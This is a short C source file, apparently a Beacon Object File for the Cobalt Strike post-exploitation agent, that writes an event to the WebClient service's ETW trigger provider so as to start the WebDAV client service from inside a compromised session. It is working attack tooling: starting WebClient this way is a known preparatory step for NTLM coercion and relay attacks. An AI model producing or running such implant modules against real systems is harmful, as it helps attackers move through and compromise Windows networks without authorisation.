#include <windows.h>
#include <evntprov.h>
#include "beacon.h"

DECLSPEC_IMPORT ULONG EVNTAPI ADVAPI32$EventRegister(LPCGUID ProviderId, PENABLECALLBACK EnableCallback, PVOID CallbackContext, PREGHANDLE RegHandle);
DECLSPEC_IMPORT ULONG EVNTAPI ADVAPI32$EventUnregister( REGHANDLE RegHandle);
DECLSPEC_IMPORT ULONG EVNTAPI ADVAPI32$EventWrite( REGHANDLE RegHandle, PCEVENT_DESCRIPTOR EventDescriptor,ULONG UserDataCount, PEVENT_DATA_DESCRIPTOR UserData);
DECLSPEC_IMPORT VOID EVNTAPI ADVAPI32$EventDescCreate(PEVENT_DESCRIPTOR EventDescriptor,USHORT Id,UCHAR Version,UCHAR Channel,UCHAR Level,USHORT Task,
UCHAR Opcode,ULONGLONG Keyword);

DWORD StartWebClientService()
{
    const GUID _MS_Windows_WebClntLookupServiceTrigger_Provider = { 0x22B6D684, 0xFA63, 0x4578, { 0x87, 0xC9, 0xEF, 0xFC, 0xBE, 0x66, 0x43, 0xC7 } };
    REGHANDLE Handle;
    DWORD success = 0;

    BeaconPrintf(CALLBACK_OUTPUT, "[i]: Registering the ETW event trigger.\n");
    if (ADVAPI32$EventRegister(&_MS_Windows_WebClntLookupServiceTrigger_Provider, NULL, NULL, &Handle) == success)
    {
        EVENT_DESCRIPTOR desc;

        EventDescCreate(&desc, 1, 0, 0, 4, 0, 0, 0);

        success = ADVAPI32$EventWrite(Handle, &desc, 0, NULL);

        ADVAPI32$EventUnregister(Handle);
    }

    return success;
}

void go(char* args, int length) {

    if(StartWebClientService() == 0){
        BeaconPrintf(CALLBACK_OUTPUT, "[+]: ETW event trigger registered, WebClient should be started, use 'sc_query WebClient' for confirmation.\n");
    }else{
        BeaconPrintf(CALLBACK_OUTPUT, "[!]: ETW event trigger registration failed.\n");
    }
}


